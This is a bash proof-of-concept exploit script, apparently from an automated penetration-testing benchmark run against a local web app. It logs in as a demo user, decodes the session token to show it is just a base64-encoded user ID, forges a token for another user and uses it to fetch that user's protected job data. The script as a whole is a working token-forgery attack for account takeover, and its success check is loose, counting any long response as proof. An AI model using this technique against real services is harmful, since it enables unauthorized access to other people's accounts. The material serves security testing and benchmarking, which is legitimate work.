#!/bin/bash
# POC: Demonstrates weak token generation vulnerability where user tokens are simply base64-encoded user IDs. Shows how to forge authentication tokens for arbitrary user accounts.
# Target: ./repo
# Created: 2025-11-10T14:47:50.918Z
# Session: benchmark-XBEN-021-24-mht8yjkr

# Weak Token Generation POC
# This script demonstrates how to exploit weak token generation
# where tokens are simply base64-encoded user IDs

TARGET_URL="http://localhost:8080"
LOGIN_ENDPOINT="${TARGET_URL}/token"
TEST_ENDPOINT="${TARGET_URL}/company/2/jobs"

echo "=== Weak Token Generation Vulnerability POC ==="
echo ""

# Step 1: Obtain legitimate token for user ID 1
echo "[*] Step 1: Obtaining legitimate token for user ID 1..."
echo "[*] Request: curl -i -X POST ${LOGIN_ENDPOINT} -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=demo&password=demo\""
echo ""

RESPONSE=$(curl -s -i -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" 2>&1)

# Extract the token from Set-Cookie header
LEGITIMATE_TOKEN=$(echo "${RESPONSE}" | grep -i "set-cookie:" | grep "user_token" | sed 's/.*user_token="\([^"]*\)".*/\1/' | head -1)

echo "[+] Response received:"
echo "${RESPONSE}" | head -20
echo ""

if [ -z "$LEGITIMATE_TOKEN" ]; then
  echo "[-] Failed to extract token from response"
  exit 1
fi

echo "[+] Legitimate token extracted: $LEGITIMATE_TOKEN"
echo ""

# Step 2: Decode the legitimate token to verify it's base64(user_id)
echo "[*] Step 2: Analyzing the token structure..."
TOKEN_VALUE=$(echo "$LEGITIMATE_TOKEN" | sed 's/Bearer //')
DECODED=$(echo "$TOKEN_VALUE" | base64 -d 2>/dev/null)
echo "[+] Token without 'Bearer': $TOKEN_VALUE"
echo "[+] Base64 decoded token: $DECODED"
echo ""

# Step 3: Forge a token for user ID 2
echo "[*] Step 3: Forging token for user ID 2..."
FORGED_USER_ID="2"
FORGED_TOKEN_VALUE=$(echo -n "$FORGED_USER_ID" | base64)
FORGED_TOKEN="Bearer ${FORGED_TOKEN_VALUE}"
echo "[+] User ID to forge: $FORGED_USER_ID"
echo "[+] Base64 encoded: $FORGED_TOKEN_VALUE"
echo "[+] Forged token: $FORGED_TOKEN"
echo ""

# Step 4: Test the forged token against a protected endpoint
echo "[*] Step 4: Testing forged token against protected endpoint..."
echo "[*] Request: curl -s -b \"user_token=\\\"${FORGED_TOKEN}\\\"\" ${TEST_ENDPOINT}"
echo ""

FORGED_RESPONSE=$(curl -s -b "user_token=\"${FORGED_TOKEN}\"" "${TEST_ENDPOINT}" 2>&1)

echo "[+] Response with forged token:"
echo "${FORGED_RESPONSE}" | head -50
echo ""

# Step 5: Check if the forged token granted access
if echo "${FORGED_RESPONSE}" | grep -q "jobs\|Job\|200\|success" || [ $(echo "${FORGED_RESPONSE}" | wc -c) -gt 100 ]; then
  echo "[+] SUCCESS: Forged token granted access to user ID 2's data!"
  echo "[+] VULNERABILITY CONFIRMED: Weak token generation allows account takeover"
  exit 0
else
  echo "[*] Response indicates potential access or needs further verification"
  echo "[*] Check if the forged token was accepted by examining the response above"
  exit 0
fi